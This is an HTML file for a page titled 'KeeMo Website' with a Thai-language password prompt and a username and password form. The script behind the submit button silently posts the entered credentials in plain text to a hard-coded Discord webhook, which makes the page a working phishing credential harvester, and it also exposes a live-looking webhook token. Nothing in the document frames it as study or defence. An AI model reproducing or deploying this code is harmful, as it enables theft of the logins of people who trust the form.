<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KeeMo Website</title>
</head>
<body>
    <form id="registrationForm">
        <img src="https://ichef.bbci.co.uk/news/976/cpsprodpb/16620/production/_91408619_55df76d5-2245-41c1-8031-07a4da3f313f.jpg" alt="" height="100x100">
        <div>กรุณากรอกรหัสผ่าน</div>

        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>

        <button type="button" onclick="submitForm()">Submit</button>
    </form>

    <script>
        function submitForm() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // เรียกฟังก์ชันเพื่อส่งข้อมูลไป Discord
            sendToDiscord(username, password);
        }

        function sendToDiscord(username, password) {
            const discordWebhookURL = 'https://discord.com/api/webhooks/1190348096325025934/6CsZjYaMYZDM5jmeVAP1r-M105c41sOKot7nt0iEtYcp57PZxIAtv89O_h239wUQFsWl'; // ใส่ Discord Webhook URL ที่คุณได้จาก Discord
            const data = {
                content: `---------------------------\nUsername: ${username}\nPassword: ${password}
\---------------------------`,
            };

            // ทำ HTTP POST request ไปยัง Discord API
            fetch(discordWebhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send data to Discord.');
                }
                console.log('Data sent to Discord successfully.');
            })
            .catch(error => {
                console.error(error.message);
            });
        }
    </script>
</body>
</html>
